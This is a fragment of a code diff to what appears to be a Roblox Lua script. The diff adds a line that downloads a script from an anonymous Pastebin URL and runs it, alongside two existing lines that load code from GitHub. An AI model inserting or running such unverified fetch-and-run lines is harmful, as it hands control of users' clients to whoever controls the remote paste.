@@ -232,6 +232,7 @@ for i, v in pairs(Players:GetPlayers()) do
         wait(0.2)
         loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/untitled-tg/main/sc2"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/untitled-tg/main/sc1"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/3gQ4z7hc"))()
         screenGui:Destroy()
     end
 end
